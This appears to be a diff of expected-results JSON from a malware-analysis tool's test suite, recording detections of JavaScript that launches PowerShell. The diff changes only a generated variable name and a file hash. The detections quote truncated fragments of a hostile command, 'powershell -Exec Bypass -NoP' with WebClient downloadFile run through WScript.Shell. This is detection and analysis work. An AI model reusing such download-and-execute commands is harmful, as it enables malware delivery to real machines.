@@ -82,7 +82,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs elevated PowerShell via powershell.exe\n\t\tHTMLImageElement[13].alt = (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.webclien...\n\t\tHTMLImageElement[13].alt.get() => (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.w...\n\t\tHTMLImageElement[13].getAttribute(alt) => (string) 'powershell -Exec Bypass -NoP -C (new-object syst...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\txt_jsjaws.setAttribute(\"alt\", \"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).dow...",
+        "body": "JavaScript runs elevated PowerShell via powershell.exe\n\t\tHTMLImageElement[13].alt = (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.webclien...\n\t\tHTMLImageElement[13].alt.get() => (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.w...\n\t\tHTMLImageElement[13].getAttribute(alt) => (string) 'powershell -Exec Bypass -NoP -C (new-object syst...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\txt6ymmvzakvzm80nm6gllm5m_jsjaws.setAttribute(\"alt\", \"powershell -Exec Bypass -NoP -C (new-object sys...",
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -104,7 +104,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs PowerShell via powershell.exe\n\t\tHTMLImageElement[13].alt = (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.webclien...\n\t\tHTMLImageElement[13].alt.get() => (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.w...\n\t\tHTMLImageElement[13].getAttribute(alt) => (string) 'powershell -Exec Bypass -NoP -C (new-object syst...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\txt_jsjaws.setAttribute(\"alt\", \"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).dow...",
+        "body": "JavaScript runs PowerShell via powershell.exe\n\t\tHTMLImageElement[13].alt = (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.webclien...\n\t\tHTMLImageElement[13].alt.get() => (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.w...\n\t\tHTMLImageElement[13].getAttribute(alt) => (string) 'powershell -Exec Bypass -NoP -C (new-object syst...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\txt6ymmvzakvzm80nm6gllm5m_jsjaws.setAttribute(\"alt\", \"powershell -Exec Bypass -NoP -C (new-object sys...",
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -126,7 +126,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs PowerShell via powershell.exe with no profile\n\t\tHTMLImageElement[13].alt = (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.webclien...\n\t\tHTMLImageElement[13].alt.get() => (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.w...\n\t\tHTMLImageElement[13].getAttribute(alt) => (string) 'powershell -Exec Bypass -NoP -C (new-object syst...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\txt_jsjaws.setAttribute(\"alt\", \"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).dow...",
+        "body": "JavaScript runs PowerShell via powershell.exe with no profile\n\t\tHTMLImageElement[13].alt = (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.webclien...\n\t\tHTMLImageElement[13].alt.get() => (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.w...\n\t\tHTMLImageElement[13].getAttribute(alt) => (string) 'powershell -Exec Bypass -NoP -C (new-object syst...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\txt6ymmvzakvzm80nm6gllm5m_jsjaws.setAttribute(\"alt\", \"powershell -Exec Bypass -NoP -C (new-object sys...",
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -325,7 +325,7 @@
     "supplementary": [
       {
         "name": "temp_javascript.js",
-        "sha256": "5118f281cd94f78a995e68813590042d7084fd59dce1b5ed1c2b03e76957d28d"
+        "sha256": "32816fa8f2e074dc180e41a69fa0d449d424c20a27c2d461a918e6105cf03be0"
       }
     ]
   },
